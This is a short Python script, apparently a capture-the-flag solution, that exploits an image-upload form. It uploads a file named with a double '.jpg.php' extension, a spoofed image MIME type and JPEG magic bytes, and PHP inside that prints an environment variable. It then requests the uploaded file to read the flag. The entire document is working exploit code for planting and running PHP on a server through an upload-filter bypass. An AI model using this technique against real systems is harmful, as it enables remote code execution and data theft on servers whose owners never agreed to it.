import requests
import re
import sys

'''
@文件命名：X-067-24
@使用方式: python X-067-24.py url
@简述思路: 图片上传处后缀绕过，写入 PHP 并通过访问上传路径读取 FLAG 环境变量。
'''


def Scan(url):
    upload = url + "/index.php"
    payload = b"\xff\xd8<?php echo getenv('FLAG'); ?>"
    files = {'userfile': ('pwn.jpg.php', payload, 'image/jpeg')}
    data = {'submit': 'Upload Image'}
    requests.post(upload, files=files, data=data)

    flag = requests.get(url + "/upload/pwn.jpg.php").text
    m = re.search(r"FLAG\{[^}]+\}", flag)
    return m.group(0) if m else flag


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
